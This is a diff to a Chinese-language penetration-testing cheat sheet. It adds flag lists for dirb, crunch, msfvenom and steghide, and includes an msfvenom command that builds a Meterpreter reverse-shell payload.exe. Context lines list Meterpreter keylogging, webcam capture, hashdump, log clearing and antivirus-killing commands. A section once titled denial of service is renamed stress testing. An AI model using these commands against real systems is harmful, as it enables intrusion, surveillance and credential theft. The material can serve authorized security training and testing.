@@ -187,6 +187,7 @@ index of                         //发现允许目录浏览的web网站
 > dirb URL \[file] \[options]
 
 ```
+-a <agent_string>                 //指定自定义User-Agent
 -c <cookie_string>                //设置HTTP请求的cookie
 -H <header_string>                //向HTTP请求添加自定义头
 -i                                //使用不区分大小写的搜索
@@ -196,6 +197,8 @@ index of                         //发现允许目录浏览的web网站
 -r                                //不递归搜索
 -R                                //交互式递归(询问每个目录)
 -u <username:password>            //HTTP身份验证
+-w                                //不要停留在警告信息上
+-X/-x <extensions>                //在每个单词后附加此扩展名
 -z <s>                            //添加一个毫秒的延迟,以避免造成过多的溢出
 ```
 
@@ -268,6 +271,22 @@ index of                         //发现允许目录浏览的web网站
 ```
 
 ## 密码破解
+
+### Crunch
+
+> crunch 7 7 -t p@ss,%^ -l a@aaaaa
+
+```
+-b num                        //指定文件输出的大小(kb,mb,gb,kib,mib,gib)
+-e str                        //指定停止字符串
+-f                            //指定库中字符集(/usr/share/crunch/charset.lst)
+-l                            //与-t联用,表明字符为实义字符
+-o file                       //将密码保存到指定文件
+-p a b ..                     //组合元素进行生成
+-s str                        //指定起始字符串
+-t                            //指定密码输出的格式(%数字 ^符号 @小写 ,大写)
+-z                            //压缩生成的字典文件(gzip,bzip2,lzma,7z)
+```
 
 ### Hydra
 
@@ -394,7 +413,7 @@ set dns.spoof.domains google.com          //设置要欺骗的域名
 set dns.spoof.address desired_IP          //设置要重定向的地址
 ```
 
-## 拒绝服务
+## 压力测试
 
 > iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 192.168.0.1 -j DROP
 
@@ -426,6 +445,7 @@ set dns.spoof.address desired_IP          //设置要重定向的地址
 ### 常用命令
 
 ```
+search -S script web_delivery
 search exploit/multi/handler
 use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_tcp
@@ -434,6 +454,28 @@ show advanced
 set autorunscript migrate -n explorer.exe
 sessions -u ID
 route add 192.168.0.0/24 ID
+```
+
+### Msfvenom
+
+```
+-p payload                     //指定payload,自定义使用'-'
+-l module                      //列出指定模块的可用资源
+-f format                      //指定输出格式,--list formats查看格式列表
+-e encoder                     //指定编码器
+-i num                         //指定编码次数
+-b chars                       //规避的字符集,例"\x00\xff"
+-x file                        //指定自定义模板
+-k                             //保护模板动作,注入payload将作为新进程运行
+-o file                        //输出文件
+--encrypt                      //指定加密方式
+--encrypt-key                  //用于加密的密钥
+--shellest                     //最小化生成payload
+-----------------------------------------------------------------
+msfvenom -l payloads
+msfvenom -p windows/x64/meterpreter/reverse_tcp --list-options
+msfvenom --list formats
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=5555 -f exe -o payload.exe
 ```
 
 ### Meterpreter
@@ -447,7 +489,7 @@ shell                           //进入系统命令行
 search                          //搜索文件
 download                        //下载文件或目录
 upload                          //上传文件或目录
------------------------------------------
+-----------------------------------------------------
 keyscan_dump                    //显示键盘记录信息
 keyscan_start                   //开始捕获按键
 keyscan_stop                    //停止捕获击键
@@ -457,7 +499,7 @@ record_mic                      //录制默认麦克风的音频X秒
 webcam_list                     //列出网络摄像头
 webcam_snap                     //从指定的网络摄像头拍摄快照
 webcam_stream                   //从指定的网络摄像头播放视频流
------------------------------------------
+-----------------------------------------------------
 sysinfo                         //获取操作系统的信息
 portfwd                         //端口转发
 getprivs                        //尝试启用当前进程可用的所有特权
@@ -465,7 +507,7 @@ getsystem                       //尝试提权
 hashdump                        //导出密码的哈希
 timestomp                       //改变文件属性
 clearev                         //清除事件日志
------------------------------------------
+-----------------------------------------------------
 run autoroute                   //自动路由
 run killav                      //关闭杀毒
 run getgui                      //远程桌面
@@ -473,9 +515,24 @@ run get_application_list        //软件信息
 run dumplinks                   //最近操作
 ```
 
-## 扩展工具
+## 取证工具
+
+### steghide
+
+```
+embed/--embed                    //嵌入数据
+extract/--extract                //提取数据
+info/--info                      //显示相关信息
+encinfo/--encinfo                //显示受支持的加密算法列表
+-ef                              //选择要嵌入的文件
+-cf                              //选择要覆盖文件
+-sf                              //选择要提取的文件
+-p                               //指定密码
+-e                               //指定加密方式
+```
+
+## 推荐扩展
 
 - [中国蚁剑](https://github.com/AntSwordProject/AntSword-Loader)
-- [web 密码检索](https://github.com/djhohnstein/SharpWeb)
 - [密码检索工具](https://github.com/AlessandroZ/LaZagne)
 - [Linux 提权检查](https://github.com/rebootuser/LinEnum)
